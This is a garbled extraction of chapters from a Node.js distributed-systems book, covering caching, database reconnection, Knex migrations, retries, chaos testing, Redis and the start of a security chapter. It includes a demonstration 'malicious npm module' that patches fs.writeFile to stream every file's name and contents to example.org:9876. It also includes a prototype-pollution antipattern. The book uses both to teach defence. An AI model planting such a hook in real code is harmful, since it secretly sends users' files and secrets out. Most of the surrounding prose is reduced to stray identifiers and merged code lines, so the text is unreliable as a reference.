+SIGINT	2	Yes	Terminate	Terminal trying to interrupt, à la Ctrl + C
+
+SIGQUIT	3	Yes	Terminate	Terminal trying to quit, à la Ctrl + D
+
+SIGKILL	9	No	Terminate	Process is being forcefully killed
+
+SIGUSR1	10	Yes	Start Debugger	User-defined signal 1
+
+SIGUSR2	12	Yes	Terminate	User-defined signal 2
+
+SIGTERM	12	Yes	Terminate	Represents a graceful termination
+
+SIGSTOP	19	No	Terminate	Process is being forcefully stopped
+
+process prove this, create a new file named /tmp/signals.js and add the content in
+Example 8-1. /tmp/signals.js
+#!/usr/bin/env node
+console.log(`Process ID: ${process.pid}`); process.on('SIGHUP', () => console.log('Received: SIGHUP')); process.on('SIGINT', () => console.log('Received: SIGINT')); setTimeout(() => {}, 5 * 60 * 1000); // keep process alive
+
+$ kill -s SIGHUP <PROCESS_ID>
+
+kill kill 
+process.kill()$ node -e "process.kill(<PROCESS_ID>, 'SIGHUP')"
+
+$ kill -9 <PROCESS_ID>
+
+-9 kill process Error: uv_signal_start EINVAL
+
+Building Stateless Services
+
+
+Figure 8-1. Hidden state
+server.patch('/v1/foo/:id', async (req) => { const id = req.params.id;
+const body = await req.body();
+await fetch(`http://ds1/foo/${id}`, { method: 'patch', body }); doSomethingRisky();
+await fetch(`http://ds2/foo/${id}`, { method: 'patch', body }); return 'OK';
+});
+
+
+these can be a very difficult task. I encourage you to read Martin Kleppmann’s Designing Data-Intensive Applications for more information about distributed transactions.
+Avoiding Memory Leaks
+const accounts = new Map();
+
+module.exports.set = (account_id, account) => { accounts.set(account_id, account);
+};
+
+SIGTERM accounts account_id set() 
+cls-hooked  process.namespaces = {}; function createNamespace(name) {
+process.namespaces[name] = namespace;
+}
+
+function destroyNamespace(name) { process.namespaces[name] = null;
+}
+
+process.namespacenullBounded In-Process Caches
+
+account:123account:123 
+lru-cache  Example 8-2. caching/server.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2 lru-cache@6.0 node-fetch@2.6 const fetch = require('node-fetch');
+const server = require('fastify')();
+const lru = new (require('lru-cache'))({  max: 4096,
+length: (payload, key) => payload.length + key.length, maxAge: 10 * 60 * 1_000
+});
+const PORT = process.env.PORT || 3000;
+
+server.get('/account/:account', async (req, reply) => { return getAccount(req.params.account);
+});
+server.listen(PORT, () => console.log(`http://localhost:${PORT}`));
+
+async function getAccount(account) { const cached = lru.get(account); 
+if (cached) { console.log('cache hit'); return JSON.parse(cached); } console.log('cache miss');
+const result = await fetch(`https://api.github.com/users/${account}`); const body = await result.text();
+lru.set(account, body);  return JSON.parse(body);
+
+}
+curl $ node caching/server.js
+$ time curl http://localhost:3000/account/tlhunter
+$ time curl http://localhost:3000/account/nodejs
+$ time curl http://localhost:3000/account/tlhunter
+
+
+lru-cache 
+JSON.parse() $ PORT=4000 node server.js
+$ time curl http://localhost:4000/account/tlhunter
+
+
+External Caching with Memcached
+In-memory cache
+External cache
+No cache
+
+Introducing Memcached
+set(key, val, expire)get(key1[, key2…]) add(key, val, expire)incr(key, amount) decr(key, amount) replace(key, val, expire) delete(key) flush_all() append(key, val, expire)prepend(key, val, expire)gets(key)cas(key, val, cas_id, expire) 
+Running Memcached
+-d -m -v $ docker run \
+--name distnode-memcached \
+-p 11211:11211 \
+-it --rm memcached:1.6-alpine \ memcached -m 64 -vv
+
+-it --rm 
+Caching Data with Memcached
+Example 8-3. caching/server-ext.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2 memjs@1.2 node-fetch@2.6 const fetch = require('node-fetch');
+const server = require('fastify')(); const memcache = require('memjs')
+.Client.create('localhost:11211');  const PORT = process.env.PORT || 3000;
+
+server.get('/account/:account', async (req, reply) => { return getAccount(req.params.account);
+});
+server.listen(PORT, () => console.log(`http://localhost:${PORT}`));
+
+async function getAccount(account) {
+const { value: cached } = await memcache.get(account); 
+if (cached) { console.log('cache hit'); return JSON.parse(cached); } console.log('cache miss');
+const result = await fetch(`https://api.github.com/users/${account}`); const body = await result.text();
+await memcache.set(account, body, {});  return JSON.parse(body);
+}
+.get() .set() 
+memjs .get() .set() .get() .value JSON.parse() .toString() .set() memjs $ node caching/server-ext.js
+$ PORT=4000 node caching/server-ext.js
+
+$ time curl http://localhost:3000/account/tlhunter # miss
+$ time curl http://localhost:3000/account/tlhunter # hit
+$ time curl http://localhost:4000/account/tlhunter # hit
+
+Data Structure Mutations
+
+{
+"account": {
+"id": 7,
+"balance": 100
+}
+}
+
+
+{
+"id": "7",
+"balance": 100
+}
+
+id account-info-<ACCOUNT_ID>account-info-7async function reduceBalance(account_id, item_cost) { const key = `account-info-${account_id}`;
+const account = await cache.get(key);
+const new_balance = account.account.balance - item_cost; return new_balance;
+}
+
+const new_balance = account.balance - item_cost;
+
+account.balance 
+account-info-
+<ACCOUNT_ID> account-info-<VERSION>-<ACCOUNT_ID>account-info account-info-v1-7 account-info-v2-7account-info Database Connection Resilience
+
+Running PostgreSQL
+$ docker run \
+--name distnode-postgres \
+-it --rm \
+-p 5432:5432 \
+-e POSTGRES_PASSWORD=hunter2 \
+-e POSTGRES_USER=user \
+-e POSTGRES_DB=dbconn \ postgres:12.3
+
+Automatic Reconnection
+
+pg Example 8-4. dbconn/reconnect.js, part one of two
+#!/usr/bin/env node
+
+// npm install fastify@3.2 pg@8.2
+const DatabaseReconnection = require('./db.js');  const db = new DatabaseReconnection({
+host: 'localhost', port: 5432, user: 'user', password: 'hunter2', database: 'dbconn', retry: 1_000
+});
+db.connect(); 
+db.on('error', (err) => console.error('db error', err.message)); db.on('reconnect', () => console.log('reconnecting...')); 
+db.on('connect', () => console.log('connected.')); db.on('disconnect', () => console.log('disconnected.'));
+
+DatabaseReconnection DatabaseReconnection pg retry Example 8-5. dbconn/reconnect.js, part two of two
+const server = require('fastify')(); server.get('/foo/:foo_id', async (req, reply) => {
+try {
+var res = await db.query( 
+'SELECT NOW() AS time, $1 AS echo', [req.params.foo_id]);
+} catch (e) { reply.statusCode = 503; return e;
+}
+return res.rows[0];
+});
+server.get('/health', async(req, reply) => { 
+if (!db.connected) { throw new Error('no db connection'); } return 'OK';
+});
+server.listen(3000, () => console.log(`http://localhost:3000`));
+
+GET /foo/:foo_iddb.query() time echo GET /health DatabaseReconnection .connectedDatabaseReconnection Example 8-6. dbconn/db.js, part one of three
+const { Client } = require('pg');
+const { EventEmitter } = require('events');
+
+class DatabaseReconnection extends EventEmitter { #client = null;	#conn = null;
+#kill = false;	connected = false;
+
+constructor(conn) { super(); this.#conn = conn;
+}
+
+pg DatabaseReconnection EventEmitterevents 
+clientpg.Client connkillconnectedExample 8-7. dbconn/db.js, part two of three
+connect() {
+if (this.#client) this.#client.end();  if (this.kill) return;
+const client = new Client(this.#conn); client.on('error', (err) => this.emit('error', err)); client.once('end', () => { 
+if (this.connected) this.emit('disconnect'); this.connected = false;
+if (this.kill) return;
+setTimeout(() => this.connect(), this.#conn.retry || 1_000);
+});
+client.connect((err) => { this.connected = !err;
+if (!err) this.emit('connect');
+});
+this.#client = client; this.emit('reconnect');
+}
+
+connect() DatabaseReconnection connect() kill disconnect() clientclient.on('error') end disconnect connection connect() connected connect pg end connect() client reconnect Example 8-8. dbconn/db.js, part three of three
+async query(q, p) {
+if (this.#kill || !this.connected) throw new Error('disconnected'); return this.#client.query(q, p);
+}
+
+disconnect() { this.#kill = true; this.#client.end();
+}
+}
+module.exports = DatabaseReconnection;
+query() pg.Client pg.Client#query()
+disconnect() kill pg.Client .end() kill end end $ curl http://localhost:3000/foo/hello
+>{"time":"2020-05-18T00:31:58.494Z","echo":"hello"}
+$ curl http://localhost:3000/health
+>OK
+
+connected.
+db error terminating connection due to administrator command db error Connection terminated unexpectedly
+disconnected. reconnecting... reconnecting...
+
+$ curl http://localhost:3000/foo/hello
+>{"statusCode":503,"error":"Service Unavailable",
+>"message":"disconnected"}
+$ curl http://localhost:3000/health
+>{"statusCode":error":"Internal Server Error",
+>"message":"no db connection"}
+
+connected 
+reconnecting... reconnecting... connected.
+
+curl Connection Pooling
+pg pg.Pool pg.Client
+Example 8-9. dbconn/pool.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2 pg@8.2 const { Pool } = require('pg');
+
+const db = new Pool({
+host: 'localhost', port: 5432, user: 'user', password: 'hunter2',
+database: 'dbconn', max: process.env.MAX_CONN || 10
+});
+db.connect();
+
+const server = require('fastify')(); server.get('/', async () => (
+await db.query("SELECT NOW() AS time, 'world' AS hello")).rows[0]); server.listen(3000, () => console.log(`http://localhost:3000`));
+
+max MAX_CONN pg.Pool 
+$ MAX_CONN=100 node ./dbconn/pool.js
+$ autocannon -c 200 http://localhost:3000/
+
+$ MAX_CONN=101 node ./dbconn/pool.js
+$ autocannon -c 200 http://localhost:3000/
+
+SELECT * FROM pg_settings WHERE name = 'max_connections';
+
+
+100 / 2 = 50 ; 50 / 6 = 8.3
+
+Example 8-10. dbconn/serial.js
+#!/usr/bin/env node
+// npm install pg@8.2
+const { Client } = require('pg'); const db = new Client({
+host: 'localhost', port: 5432, user: 'user', password: 'hunter2', database: 'dbconn'
+});
+db.connect();
+(async () => {
+const start = Date.now(); await Promise.all([ 
+db.query("SELECT pg_sleep(2);"), db.query("SELECT pg_sleep(2);"),
+]);
+console.log(`took ${(Date.now() - start) / 1000} seconds`); db.end();
+
+})();
+pg_sleep() Client Pool pg Schema Migrations with Knex
+
+000001.sql 000001-reverse.sql 000002.sql 000002-reverse.sql 000003.sql  000003-reverse.sql
+
+20200523133741_create_users.js 20200524122328_create_groups.js 20200525092142_make_admins.js
+
+knex_migrations
+Configuring Knex
+knex knex  $ mkdir migrations && cd migrations
+$ npm init -y
+$ npm install knex@0.21 pg@8.2
+$ npm install -g knex@0.21
+$ knex init
+
+knex 
+your migrations/knexfile.js file to resemble Example 8-11.
+Example 8- 1. migrations/knexfile.js
+module.exports = { development: {
+client: 'pg', connection: {
+host: 'localhost', port: 5432, user: 'user', password: 'hunter2', database: 'dbconn'
+}
+}
+};
+$ knex migrate:currentVersion
+>Using environment: development
+>Current Version: none
+
+NODE_ENV noneCreating a Schema Migration
+$ knex migrate:make create_users
+$ ls migrations
+
+knex migrate:make 
+Example 8-12. migrations/migrations/20200525141008_create_users.js
+module.exports.up = async (knex) => {
+await knex.schema.createTable('users', (table) => { table.increments('id').unsigned().primary(); table.string('username', 24).unique().notNullable();
+});
+
+await knex('users')
+.insert([
+{username: 'tlhunter'},
+{username: 'steve'},
+{username: 'bob'},
+]);
+};
+
+module.exports.down = (knex) => knex.schema.dropTable('users');
+
+up() down()up() down() up() down() up() down() down() 
+$ knex migrate:list
+>No Completed Migration files Found.
+>Found 1 Pending Migration file/files.
+>20200525141008_create_users.js
+
+Applying a Migration
+$ knex migrate:up
+>Batch 1 ran the following migrations:
+>20200525141008_create_users.js
+
+knex migrate:up psql $ docker exec \
+-it distnode-postgres \ psql -U user -W dbconn
+
+hunter2 \dt Schema |	Name	| Type | Owner
+--------+----------------------+-------+-------
+public | knex_migrations  | table | user public | knex_migrations_lock | table | user public | users	| table | user
+
+users 
+SELECT * FROM users; and press enter again. You should see results like these:
+id | username
+----+----------
+1| tlhunter
+2| steve
+3| bob
+
+CREATE TABLE users (
+id serial NOT NULL,
+username varchar(24) NOT NULL, CONSTRAINT users_pkey PRIMARY KEY (id),
+CONSTRAINT users_username_unique UNIQUE (username));
+
+SELECT * FROM knex_migrations;id |	name	| batch |	migration_time
+----+--------------------------------+-------+---------------------------
+2 | 20200525141008_create_users.js |	1 | 2020-05-25 22:17:19.15+00
+
+knex_migrations_lock
+$ knex migrate:make create_groups
+
+Example 8-13. migrations/migrations/20200525172807_create_groups.js
+module.exports.up = async (knex) => { await knex.raw(`CREATE TABLE groups (
+id SERIAL PRIMARY KEY,
+name VARCHAR(24) UNIQUE NOT NULL)`);
+await knex.raw(`INSERT INTO groups (id, name) VALUES (1, 'Basic'), (2, 'Mods'), (3, 'Admins')`);
+await knex.raw(`ALTER TABLE users ADD COLUMN
+group_id INTEGER NOT NULL REFERENCES groups (id) DEFAULT 1`);
+};
+
+module.exports.down = async (knex) => {
+await knex.raw(`ALTER TABLE users DROP COLUMN group_id`); await knex.raw(`DROP TABLE groups`);
+};
+groups users group_id groups $ knex migrate:latest
+
+migrate Rolling Back a Migration
+$ knex migrate:down
+
+Batch 2 rolled back the following migrations: 20200525172807_create_groups.js
+
+down() knex migrate:list -- WARNING: DESTRUCTIVE MIGRATION!
+-- MIGRATE UP
+ALTER TABLE users DROP COLUMN username;
+-- MIGRATE DOWN
+ALTER TABLE users ADD COLUMN username VARCHAR(24) UNIQUE NOT NULL;
+
+Live Migrations
+
+Figure 8-2. Broken migration timeline
+Live migration scenario
+
+CREATE TABLE people ( id SERIAL,
+fname VARCHAR(20) NOT NULL, lname VARCHAR(20) NOT NULL);
+
+async function getUser(id) { const result = await db.raw(
+'SELECT fname, lname FROM people WHERE id = $1', [id]); const person = result.rows[0];
+return { id, fname: person.fname, lname: person.lname };
+}
+
+async function setUser(id, fname, lname) { await db.raw(
+'UPDATE people SET fname = $1, lname = $2 WHERE id = $3', [fname, lname, id]);
+}
+
+ fname lname name Commit A: Beginning the transition
+name fname lname name name NOT NULL 
+ALTER NOT NULL up() ALTER TABLE people ADD COLUMN name VARCHAR(41) NULL; ALTER TABLE people ALTER COLUMN fname DROP NOT NULL; ALTER TABLE people ALTER COLUMN lname DROP NOT NULL;
+
+name name name fname lname async function getUser(id) { const result = await db.raw(
+'SELECT * FROM people WHERE id = $1', [id]); const person = result.rows[0];
+const name = person.name || `${person.fname} ${person.lname}`; return { id, name };
+}
+
+async function setUser(id, name) { await db.raw(
+'UPDATE people SET name = $1 WHERE id = $2', [name, id]);
+}
+
+name setUser() Commit B: Backfill
+
+name name fname lname up() UPDATE people SET name = CONCAT(fname, ' ', lname) WHERE name IS NULL;
+
+WHERE name IS NULL AND id >= 103000 AND id < 104000
+
+Commit C: Finishing the transition
+up() 
+ALTER TABLE people ALTER COLUMN name SET NOT NULL;
+ALTER TABLE people DROP COLUMN fname; ALTER TABLE people DROP COLUMN lname;
+
+getUser() fname lname async function getUser(id) { const result = await db.raw(
+'SELECT name FROM people WHERE id = $1', [id]); return { id, name: result.rows[0].name };
+}
+
+setUser() Figure 8-3. Working migration timeline
+name name name 
+Idempotency and Messaging Resilience
+
+Figure 8-4. Protocol errors
+Error#code Table 8-3. Node.js network errors
+
+Error	Context	Ambiguous	Meaning
+
+EACCES	Server	N/A	Cannot listen on port due to permissions
+
+EADDRINUSE	Server	N/A	Cannot listen on port since another process has it
+
+ECONNREFUSED	Client	No	Client unable to connect to server
+
+ENOTFOUND	Client	No	DNS lookup for the server failed
+
+ECONNRESET	Client	Yes	Server closed connection with client
+
+EPIPE	Client	Yes	Connection to server has closed
+
+ETIMEDOUT	Client	Yes	Server didn’t respond in time
+EACCESS EADDRINUSEEACCESS EADDRINUSE ECONNREFUSED ENOTFOUND HTTP Retry Logic
+
+Figure 8-5. HTTP retry flowchart
+ECONNREFUSED ENOTFOUNDECONNRESETEPIPEETIMEDOUTTable 8-4. HTTP method matrix
+
+Method	Idempotent	Destructive	Safe	4XX	5XX	Ambiguous	Purpose
+
+GET	Yes	No	Yes	No Retry	Retry	Retry	Retrieve resource(s)
+
+POST	No	No	No	No Retry	No Retry	No Retry	Create resource
+
+PUT	Yes	Yes	No	No Retry	Retry	Retry	Create or modify resource
+
+PATCH	No	Yes	No	No Retry	Retry	Retry	Modify resource
+
+DELETE Yes	Yes	No	No Retry
+
+Retry	Retry	Remove resource
+
+GET DELETE /recipes/42PUT PATCH DELETE ETag If-Match GET 
+AULT = 5000;
+const SCHEDULE = [100, 250, 500, 1000, 2500];
+const redis = new Redis({ retryStrategy: (times) => {
+return SCHEDULE[times] || DEFAULT;
+}
+});
+
+retrySchedule() 
+10ms | 20ms | 40ms | quit
+
+Figure 8-7. Thundering herd
+
+const redis = new Redis({ retryStrategy: (times) => {
+let time = SCHEDULE[times] || DEFAULT;
+return Math.random() * (time * 0.2) + time * 0.9; // ±10%
+}
+});
+
+setInterval(fn, 60_000) const PERIOD = 60_000;
+const OFFSET = Math.random() * PERIOD; setTimeout(() => {
+setInterval(() => { syncStats();
+}, PERIOD);
+}, OFFSET);
+
+071 077 102 131 137 162 191 197 222
+
+060 060 060 120 120 120 180 180 180
+
+
+Resilience Testing
+Random Crashes
+
+Example 8-14. Random crash chaos
+if (process.env.NODE_ENV === 'staging') {
+const LIFESPAN = Math.random() * 100_000_000; // 0 - 30 hours setTimeout(() => {
+console.error('chaos exit'); process.exit(99);
+}, LIFESPAN);
+}
+Event Loop Pauses
+
+Example 8-15. Random event loop pauses
+const TIMER = 100_000; function slow() {
+fibonacci(1_000_000n);
+setTimeout(slow, Math.random() * TIMER);
+}
+setTimeout(slow, Math.random() * TIMER);
+Random Failed Async Operations
+Example 8-16. Random async failures
+const THRESHOLD = 10_000;
+async function chaosQuery(query) {
+if (math.random() * THRESHOLD <= 1) { throw new Error('chaos query');
+}
+return db.query(query);
+
+}
+const result = await chaosQuery('SELECT foo FROM bar LIMIT 1'); return result.rows[0];
+
+chaosQuery()db.query() node-fetch
+An exit status can also be set by assigning a code to process.exitStatus and then calling
+process.exit() without an argument.
+1	There’s also a process.abort() method available. Calling it immediately terminates the process, prints some memory locations, and writes a core dump file to disk if the OS is configured to do so.
+2The deprecated internal domain module provides a way to capture error events from many
+EventEmitter instances.
+3I reported this issue to the package author two years ago. Fingers crossed!
+4	Languages like Rust and C++ allow for extremely accurate memory calculations; with JavaScript, we can only work with approximations.
+5You can also avoid globally installing knex by prefixing each of the commands with npx, such as
+npx knex init.
+6Some systems think that my first name is “Thomas Hunter” and my last name is “II.”
+
+Chapter 9. Distributed Primitives
+
+
+Map Array#push() Array#pop()JSON.stringify() fs.writeFileSync()
+The ID Generation Problem
+“How would you design a link shortening service?”
+0-9A-F
+0-90-9a- zA-Z
+Example 9-1. link-shortener.js
+const fs = require('fs'); fs.writeFileSync('/tmp/count.txt', '0'); // only run once function setUrl(url) {
+const id = Number(fs.readFileSync('/tmp/count.txt').toString()) + 1; fs.writeFileSync('/tmp/count.txt', String(id)); fs.writeFileSync(`/tmp/${id}.txt`, url);
+return `sho.rt/${id}`;
+}
+function getUrl(code) {
+return fs.readFileSync(`/tmp/${code}.txt`).toString();
+}
+setUrl()
+counter setUrl() getUrl() 
+Figure 9-1. Single-threaded get and set operations
+setUrl() getUrl() 
+wx fs.writeFileSync('/tmp/lock.txt', '', { flag: 'wx' });
+
+fs.unlinkSync()fs.writeFileSync() while Introduction to Redis
+
+$ docker run -it --rm \
+--name distnode-redis \
+-p 6379:6379 \
+
+redis:6.0.5-alpine
+
+6379$ echo "PING\r\nQUIT\r\n" | nc localhost 6379
+> +PONG
+> +OK
+
+PING QUITQUIT
+redis-cli $ docker exec -it \ distnode-redis \ redis-cli
+
+INFO server 
+Redis Operations
+ user:123user:123:friendsioredis $ mkdir redis && cd redis
+$ npm init -y
+$ npm install ioredis@4.17
+
+Example 9-2. redis/basic.js
+#!/usr/bin/env node
+// npm install ioredis@4.17
+
+const Redis = require('ioredis');
+const redis = new Redis('localhost:6379');
+
+(async () => {
+await redis.set('foo', 'bar');
+const result = await redis.get('foo'); console.log('result:', result); redis.quit();
+})();
+
+ioredis redis redis.get() GET redis.set('foo', 'bar') SET foo bar
+$ node redis/basic.js
+>result: bar
+
+
+Strings
+SET foo "bar"
+
+SET redis-cli SET SET key value [EX seconds|PX milliseconds] [NX|XX] [KEEPTTL]
+
+EX 1PX 1000NX XX KEEPTTL GET foo
+>"bar"
+
+
+SET visits "100"
+>OK
+INCR visits
+>(integer) 101
+
+100101INCR INCRBY GET visits INCR APPEND INCRBYFLOAT Lists
+
+RPUSH list aaa
+>(integer) 1 RPUSH list bbb
+>(integer) 2
+LRANGE list 0 -1
+>1) "aaa"
+>2) "bbb"
+
+RPUSH RPUSH LRANGE LRANGE LRANGE key 0 -1 Table 9-1. Redis list commands and equivalent JavaScript array operations
+
+Operation	Redis command	JavaScript array equivalent
+Add entry to right	
+RPUSH key element	
+arr.push(element)
+Add entry to left	
+LPUSH key element	
+arr.unshift(element)
+Take entry from right	
+RPOP key element	
+arr.pop(element)
+Take entry from left	
+LPOP key element	
+arr.shift(element)
+Get length	
+LLEN key	
+arr.length
+Retrieve element at index	
+LINDEX key index	
+x = arr[index]
+
+
+Replace element at index	LSET key index element	arr[index] = x
+Move element	
+RPOPLPUSH source dest	
+dest.push(source.pop())
+Get element range	
+LRANGE key start stop	
+arr.slice(start, stop+1)
+Get first occurence	
+LPOS key element	
+arr.indexOf(element)
+Get last occurence	
+RPOS key element	
+arr.lastIndexOf(element)
+Reduce size	
+LTRIM key start stop	
+arr=arr.slice(start,stop+1)
+RPOPLPUSH RPOPLPUSH RPOP LPUSH Sets
+new Set() SADD set alpha
+
+>(integer) 1 SADD set beta
+>(integer) 1 SADD set beta
+>(integer) 0 SMEMBERS set
+>1) "beta"	2) "alpha"
+
+SADD SADD SMEMBERS SetTable 9-2. Redis set commands and equivalent JavaScript set
+operations
+
+Operation	Redis command	JavaScript set equivalent
+Add entry to set	
+SADD key entry	
+set.add(entry)
+Count entries	
+SCARD key	
+set.size
+See if set has entry	
+SISMEMBER key entry	
+set.has(entry)
+Remove entry from set	
+SREM key entry	
+set.delete(entry)
+Retrieve all entries	
+SMEMBERS key	
+Array.from(set)
+Move between sets	
+SMOVE src dest entry	
+s2.delete(entry) && s1.add(entry)
+SRANDMEMBER SPOP SSCAN 
+Hash
+new Map() HSET obj a 1
+>(integer) 1 HSET obj b 2
+>(integer) 1 HSET obj b 3
+>(integer) 0 HGETALL obj
+1) "a"	2) "1"	3) "b"	4) "3"
+
+HSET obj b HGETALL ioredis{a:1,b:2}Map
+Table 9-3. Redis hash commands and equivalent JavaScript map operations
+
+Operation	Redis command	JavaScript map equivalent
+Set an entry	
+HSET key field value	
+map.set(field, value)
+Remove an entry	
+HDEL key field	
+map.delete(field)
+Has an entry	
+HEXISTS key field	
+map.has(field)
+Retrieve an entry	
+HGET key field	
+map.get(field)
+Get all entries	
+HGETALL key	
+Array.from(map)
+List keys	
+HKEYS key	
+Array.from(map.keys())
+List values	
+HVALS key	
+Array.from(map.values())
+Map Number vmap.get(field).v++HINCRBY key field 1{"wage": 100000, "...other fields": "..."}
+
+wage GET key result = JSON.parse(response) result.wage +=
+
+1000 payload = JSON.stringify(result) SET key payload Sorted Sets
+ZADD scores 1000 tlhunter ZADD scores 500 zerker ZADD scores 100 rupert ZINCRBY scores 10 tlhunter
+>"1010"
+ZRANGE scores 0 -1 WITHSCORES
+>	1)	"rupert"	2)	"100"
+>	3)	"zerker"	4)	"900"
+>	5)	"tlhunter"	6)	"1010"
+
+ZADD ZADD ZINCRBY ZRANGE ZRANGE key 0 -1 WITHSCORES Table 9-4. Redis sorted set commands
+Operation	Redis command
+
+
+ZREVRANK scores tlhunterREV REM 
+Generic Commands
+HDEL Table 9-5. Generic Redis commands
+Operation	Redis command
+
+
+KEYS Table 9-6. Redis server commands
+Operation	Redis Command
+
+
+Get info about server	INFO
+
+
+MONITOR Other Types
+
+Seeking Atomicity
+RPOPLPUSH RPOP
+LPUSHTable 9-7. Redis compound commands
+
+Command	Alternative pseudocode
+
+
+GETSET Figure 9-2. Sequential Redis commands like GET and SET aren’t atomic
+
+counter INCR Figure 9-3. INCR is atomic in Redis
+INCR employees employee-42
+INCR SETNX Transactions
+MULTI EXECioredis
+package. Create a new file named redis/transaction.js and add the code to it.
+Example 9-3. redis/transaction.js
+#!/usr/bin/env node
+// npm install ioredis@4.17
+const Redis = require('ioredis');
+const redis = new Redis('localhost:6379');
+
+(async () => {
+const [res_srem, res_hdel] = await redis.multi() 
+.srem("employees", "42") // Remove from Set
+.hdel("employee-42", "company-id") // Delete from Hash
+.exec(); 
+console.log('srem?', !!res_srem[1], 'hdel?', !!res_hdel[1]); redis.quit();
+})();
+
+ioredis .multi() .exec() $ docker exec distnode-redis redis-cli SADD employees 42 tlhunter
+$ docker exec distnode-redis redis-cli HSET employee-42 company-id funcorp
+$ node redis/transaction.js
+>srem? true hdel? true
+
+ioredis srem? false hdel? falseMULTI EXEC EXEC
+MULTI EXECRPOPLPUSH RPOP LPUSH 
+Figure 9-4. Redis transactions wait for EXEC before committing changes
+Lua Scripting
+ Map
+for while if EVAL SCRIPT LOAD  EVALSHA EVAL EVALSHA EVAL script numkeys key [key ...] arg [arg ...] EVALSHA sha1 numkeys key [key ...] arg [arg ...]
+
+
+numkeys numkeys
+Writing a Lua Script File
+Example 9-4. redis/add-user.lua
+local LOBBY = KEYS[1] -- Set local GAME = KEYS[2] -- Hash local USER_ID = ARGV[1] -- String
+
+redis.call('SADD', LOBBY, USER_ID)
+
+if redis.call('SCARD', LOBBY) == 4 then
+local members = table.concat(redis.call('SMEMBERS', LOBBY), ",") redis.call('DEL', LOBBY) -- empty lobby
+local game_id = redis.sha1hex(members) redis.call('HSET', GAME, game_id, members) return {game_id, members}
+end
+
+return nil
+KEYSARGV
+LOBBYlocal GAMEUSER_IDLOBBY redis.call() SADD if SCARD if nil nil null ioredis if SMEMBERS table.concat() DEL
+redis.sha1hex() HSET
+lobby{pvp} game{pvp}Loading the Lua Script
+Example 9-5. redis/script.js
+#!/usr/bin/env node
+// npm install ioredis@4.17
+const redis = new (require('ioredis'))('localhost:6379'); redis.defineCommand("adduser", {
+numberOfKeys: 2,
+lua: require('fs').readFileSync(  dirname + '/add-user.lua')
+});
+const LOBBY = 'lobby', GAME = 'game'; (async () => {
+console.log(await redis.adduser(LOBBY, GAME, 'alice')); // null console.log(await redis.adduser(LOBBY, GAME, 'bob')); // null console.log(await redis.adduser(LOBBY, GAME, 'cindy')); // null const [gid, players] = await redis.adduser(LOBBY, GAME, 'tlhunter'); console.log('GAME ID', gid, 'PLAYERS', players.split(',')); redis.quit();
+})();
+
+ioredis 
+redis.defineCommand() lobby gameredis.adduser() redis.defineCommand() redis.adduser()
+redis ADDUSER redis.adduser() null gidplayersTying It All Together
+MONITOR $ docker exec -it distnode-redis redis-cli monitor
+$ node redis/script.js
+
+redis.adduser()
+null null null
+GAME ID 523c26dfea8b66ef93468e5d715e11e73edf8620 PLAYERS [ 'tlhunter', 'cindy', 'bob', 'alice' ]
+
+MONITOR lua APP: "info"
+APP: "evalsha" "1c..32" "2" "lobby" "game" "alice"
+APP: "eval" "local...\n" "2" "lobby" "game" "alice" LUA: "SADD" "lobby" "alice"
+LUA: "SCARD" "lobby"
+... PREVIOUS 3 LINES REPEATED TWICE FOR BOB AND CINDY ...
+APP: "evalsha" "1c..32" "2" "lobby" "game" "tlhunter" LUA: "SADD" "lobby" "tlhunter"
+LUA: "SCARD" "lobby" LUA: "SMEMBERS" "lobby"
+LUA: "DEL" "lobby"
+LUA: "HSET" "game" "52..20" "tlhunter,cindy,bob,alice"
+
+INFO ioredis ioredis EVALSHA 1c..32ioredis EVAL local…SADD SCARD EVALSHASADDSCARD 
+SADDSCARDSMEMBERSDELHSET MONITOR 	For example, an È has both a single-byte and multibyte UTF representations, which are considered unequal when doing a binary comparison.
+1	Check out the Luvit.io project if you’d like to see what a Node.js-like platform implemented in Lua looks like.
+2Redis generates a SHA1 hash of the script and uses that to refer to scripts in an internal cache.
+3And assuming the players haven’t discovered a SHA1 collision.
+
+Chapter 10. Security
+
+
+Wrangling Repositories
+
+https://github.com/<org>?language=javascript
+
+
+@corp/acctTable 10-1. Example Node.js service spreadsheet
+
+Service	Team	Node.js version	Deployment	Server	Account package
+gallery	Selfie	v10.3.1	Beanstalk	express@v3.1.1	@corp/acct@v1.2.3
+profile	Profile	v12.1.3	Kubernetes	@hapi/hapi@14.3.1	@corp/acct@v2.1.1
+resizer	Selfie	v12.13.1	Lambda	N/A	N/A
+friend-finder	Friends	v10.2.3	Kubernetes	fastify@2.15.0	@corp/acct@v2.1.1
+
+process.version @corp/acct Recognizing Attack Surface
+
+Parameter Checking and Deserialization
+POST JSON.parse() User name:string age:integer
+name ageconst temp = JSON.parse(req.body);
+const user = new User({name: temp.name, age: temp.age});
+
+JSON.parse() bodyLimit body-parser limit protoobj.proto= foo Object.setPrototypeOf(obj, foo) Example 10-1. prototype-pollution.js
+
+// WARNING: ANTIPATTERN!
+function shallowClone(obj) { const clone = {};
+for (let key of Object.keys(obj)) { clone[key] = obj[key];
+}
+return clone;
+}
+const request = '{"user":"tlhunter","  proto  ":{"isAdmin":true}}'; const obj = JSON.parse(request);
+
+if ('isAdmin' in obj) throw new Error('cannot specify isAdmin'); const user = shallowClone(obj);
+console.log(user.isAdmin); // true
+
+protoisAdmin objprotoJSON.parse() obj.isAdmin shallowClone() clone['proto'] user {"isAdmin":true} 
+Malicious npm Packages
+ 
+Example 10-2. malicious-module.js
+const fs = require('fs'); const net = require('net');
+const CONN = { host: 'example.org', port: 9876 }; const client = net.createConnection(CONN, () => {}); const _writeFile = fs.writeFile.bind(fs); fs.writeFile = function() {
+client.write(`${String(arguments[0])}:::${String(arguments[1])}`); return _writeFile(...arguments);
+};
+fs.writeFile example.org:9876pg named password.
+Application Configuration
+
+Environment Variables
+$ echo "console.log('conn:', process.env.REDIS)" > app-env-var.js
+$ REDIS="redis://admin:hunter2@192.168.2.1" node app-env-var.js
+
+
+
+if (!process.env.REDIS) {
+console.error('Usage: REDIS=<redis_conn> node script.js'); process.exit(1);
+}
+
+Example 10-3. dev.env
+export REDIS=redis://admin:hunter2@192.168.2.1
+
+$ node -e "console.log(process.env.REDIS)"
+>undefined
+$ source dev.env
+$ node -e "console.log(process.env.REDIS)"
+>redis://admin:hunter2@192.168.2.1
+
+node Configuration Files
+
+config nconf NODE_ENV REDIS
+$ mkdir configuration && cd configuration
+$ npm init -y
+$ mkdir config
